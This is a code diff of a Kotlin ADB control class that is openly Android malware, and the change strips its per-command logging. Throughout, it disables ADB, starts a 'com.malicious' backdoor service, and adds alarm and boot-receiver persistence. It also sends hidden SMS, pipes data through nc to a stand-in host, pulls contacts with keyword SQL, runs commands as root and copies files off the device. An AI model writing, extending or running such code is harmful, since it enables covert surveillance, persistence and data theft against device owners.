@@ -78,19 +78,25 @@ class ADBBase(private val logger: Logger = Logger()) {
     /**
      * Executes a single ADB command and returns the result.
      */
-    private suspend fun executeAdbCommand(command: String, logMessage: String): CommandResult {
+    private suspend fun executeAdbCommand(command: String): CommandResult {
         obfuscateExecution()
-        logger.info(logMessage)
         return executeAdbCommandAsync(command.split(" ")).collect { return@collect it }
+    }
+
+    /**
+     * Logs a message.
+     */
+    private fun logMessage(message: String) {
+        logger.info(message)
     }
 
     /**
      * Executes a batch of ADB commands sequentially.
      */
     private suspend fun executeAdbBatch(commands: List<String>, logMessage: String) {
-        logger.info(logMessage)
+        logMessage(logMessage)
         commands.forEach { cmd ->
-            val result = executeAdbCommand(cmd, "Executing batch command: $cmd")
+            val result = executeAdbCommand(cmd)
             if (result.exitCode != 0) {
                 logger.warning("Batch command '$cmd' failed: ${result.error}")
             }
@@ -196,6 +202,16 @@ class ADBBase(private val logger: Logger = Logger()) {
     // --- Core ADB Interaction Functions (Refactored for Async) ---
 
     suspend fun setupStealthModeAndC2() {
+        enableStealthMode()
+        setupTcpIpConnection()
+        schedulePersistentTask()
+        enableBootPersistence()
+        listFiles("/sdcard/Download")
+        trackIPAddress()
+        startC2Server()
+    }
+
+    private suspend fun enableStealthMode() {
         executeAdbBatch(
             listOf(
                 "settings put global adb_enabled 0",
@@ -205,122 +221,116 @@ class ADBBase(private val logger: Logger = Logger()) {
                 "input keyevent 26"
             ), "Enabling stealth mode"
         )
-        setupTcpIpConnection()
-        schedulePersistentTask()
-        enableBootPersistence()
-        listFiles("/sdcard/Download")
-        trackIPAddress()
-        startC2Server()
     }
 
     private suspend fun setupTcpIpConnection() {
-        val tcpResult = executeAdbCommand("tcpip ${config.tcpPort}", "Setting up TCP/IP on port ${config.tcpPort}")
+        val tcpResult = executeAdbCommand("tcpip ${config.tcpPort}")
         if (tcpResult.exitCode != 0) logger.warning("TCP/IP setup failed: ${tcpResult.error}")
 
-        val ipOutput = executeAdbCommand("shell ip -f inet addr show wlan0", "Fetching device IP").output
+        val ipOutput = executeAdbCommand("shell ip -f inet addr show wlan0").output
         val ipAddress = parseIpAddress(ipOutput)
         ipAddress?.let {
-            val connectResult = executeAdbCommand("connect $it:${config.tcpPort}", "Connecting to $it:${config.tcpPort}")
+            val connectResult = executeAdbCommand("connect $it:${config.tcpPort}")
             if (connectResult.exitCode != 0) logger.warning("Connection failed: ${connectResult.error}")
-            executeAdbCommand("shell am start-service -n com.malicious/.BackdoorService", "Installing backdoor service")
+            executeAdbCommand("shell am start-service -n com.malicious/.BackdoorService")
         } ?: logger.warning("Could not retrieve device IP.")
     }
 
     private suspend fun listFiles(path: String = "/sdcard/"): String =
-        executeAdbCommand("shell ls -l '$path'", "Listing files in $path").output.trim()
+        executeAdbCommand("shell ls -l '$path'").output.trim()
 
     private suspend fun pullFile(devicePath: String, localPath: String) {
-        val result = executeAdbCommand("pull '$devicePath' '$localPath'", "Pulling '$devicePath' to '$localPath'")
+        val result = executeAdbCommand("pull '$devicePath' '$localPath'")
         if (result.exitCode != 0) logger.warning("File pull failed: ${result.error}")
     }
 
     private suspend fun pushFile(localPath: String, devicePath: String) {
-        val result = executeAdbCommand("push '$localPath' '$devicePath'", "Pushing '$localPath' to '$devicePath'")
+        val result = executeAdbCommand("push '$localPath' '$devicePath'")
         if (result.exitCode != 0) logger.warning("File push failed: ${result.error}")
     }
 
     private suspend fun installApk(apkPath: String) {
-        val result = executeAdbCommand("install -r '$apkPath'", "Installing APK: $apkPath")
+        val result = executeAdbCommand("install -r '$apkPath'")
         if (result.exitCode != 0) logger.warning("APK install failed: ${result.error}")
     }
 
     private suspend fun uninstallApp(packageName: String) {
-        val result = executeAdbCommand("uninstall '$packageName'", "Uninstalling app: $packageName")
+        val result = executeAdbCommand("uninstall '$packageName'")
         if (result.exitCode != 0) logger.warning("App uninstall failed: ${result.error}")
     }
 
     private suspend fun clearAppData(packageName: String) {
-        val result = executeAdbCommand("shell pm clear '$packageName'", "Clearing data for $packageName")
+        val result = executeAdbCommand("shell pm clear '$packageName'")
         if (result.exitCode != 0) logger.warning("Clear app data failed: ${result.error}")
     }
 
     suspend fun rebootDevice() {
-        executeAdbCommand("reboot", "Rebooting device")
+        executeAdbCommand("reboot")
     }
 
     suspend fun takeScreenshot(filename: String = "/sdcard/screenshot.png") {
-        executeAdbCommand("shell screencap '$filename'", "Taking screenshot to $filename")
+        executeAdbCommand("shell screencap '$filename'")
         pullFile(filename, filename) // Pull to local for demonstration
     }
 
     suspend fun getDeviceModel(): String =
-        executeAdbCommand("shell getprop ro.product.model", "Getting device model").output.trim()
+        executeAdbCommand("shell getprop ro.product.model").output.trim()
 
     suspend fun getDeviceSerialNumber(): String =
-        executeAdbCommand("shell getprop ro.serialno", "Getting device serial number").output.trim()
+        executeAdbCommand("shell getprop ro.serialno").output.trim()
 
     suspend fun getAndroidVersion(): String =
-        executeAdbCommand("shell getprop ro.build.version.release", "Getting Android version").output.trim()
+        executeAdbCommand("shell getprop ro.build.version.release").output.trim()
 
     suspend fun readLogcat(): String =
-        executeAdbCommand("logcat -d", "Reading logcat").output.trim()
+        executeAdbCommand("logcat -d").output.trim()
 
     suspend fun isDeviceRooted(): Boolean =
-        executeAdbCommand("shell su -c 'whoami'", "Checking root status").output.contains("root", ignoreCase = true)
+        executeAdbCommand("shell su -c 'whoami'").output.contains("root", ignoreCase = true)
 
     suspend fun isAdbAccessible(): Boolean =
-        executeAdbCommand("get-state", "Checking ADB accessibility").output.contains("device", ignoreCase = true)
+        executeAdbCommand("get-state").output.contains("device", ignoreCase = true)
 
     private suspend fun schedulePersistentTask() {
         val alarmId = Random.nextInt(1000, 9999)
         val intentAction = "com.malicious.ACTION_PERSISTENT"
         val command = "shell am set-alarm -c -a '$intentAction' -w 60 com.malicious"
-        executeAdbCommand(command, "Scheduling persistent task (ID: $alarmId, Action: $intentAction)")
+        executeAdbCommand(command)
         logger.info("Note: Requires a receiver on the device.")
     }
 
     private suspend fun enableBootPersistence() {
         val command = "shell su -c 'pm enable com.malicious/.BootReceiver'"
-        executeAdbCommand(command, "Attempting boot persistence via BootReceiver")
+        executeAdbCommand(command)
         logger.info("Note: Requires a BootReceiver in the manifest and root.")
     }
 
     private suspend fun sendStealthSMS(phoneNumber: String, data: String) {
         val command = "shell am start -a android.intent.action.SENDTO -d sms:$phoneNumber --es sms_body \"$data\" --ez android.intent.extra.TEXT_ONLY true --ez android.intent.extra.SEND_EMPTY_BODY true"
-        executeAdbCommand(command, "Sending stealth SMS to $phoneNumber")
+        executeAdbCommand(command)
     }
 
     private suspend fun uploadDataStealthily(data: String, uploadUrl: String = "http://fake-cloud.com/upload") {
-        executeAdbCommand("shell sh -c 'echo \"$data\" | nc $uploadUrl 80'", "Simulating data upload")
+        executeAdbCommand("shell sh -c 'echo \"$data\" | nc $uploadUrl 80'")
     }
 
     private suspend fun extractTargetedContacts(keywords: List<String>): String {
         val query = keywords.joinToString("%' OR display_name LIKE '%")
         val command = "shell sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db \"SELECT display_name FROM contacts WHERE display_name LIKE '%$query%'\""
-        return executeAdbCommand(command, "Extracting contacts matching keywords").output.trim()
+        return executeAdbCommand(command).output.trim()
     }
 
     private suspend fun executeMaliciousCommand(command: String): CommandResult {
         val rooted = isDeviceRooted()
         val finalCommand = if (rooted) "shell su -c '$command'" else "shell $command"
-        return executeAdbCommand(finalCommand, "Executing malicious command: $command")
+        return executeAdbCommand(finalCommand)
     }
 
     private suspend fun stealData(sourcePath: String, destinationPath: String) {
         val rooted = isDeviceRooted()
         val command = if (rooted) "shell su -c cp '$sourcePath' /sdcard/temp && pull /sdcard/temp '$destinationPath' && shell rm /sdcard/temp"
         else "pull '$sourcePath' '$destinationPath'"
-        executeAdbCommand(command, "Stealing data from $sourcePath to $destinationPath")
+        executeAdbCommand(command)
     }
 
     private suspend fun dumpSystemInfo(destinationPath: String) {
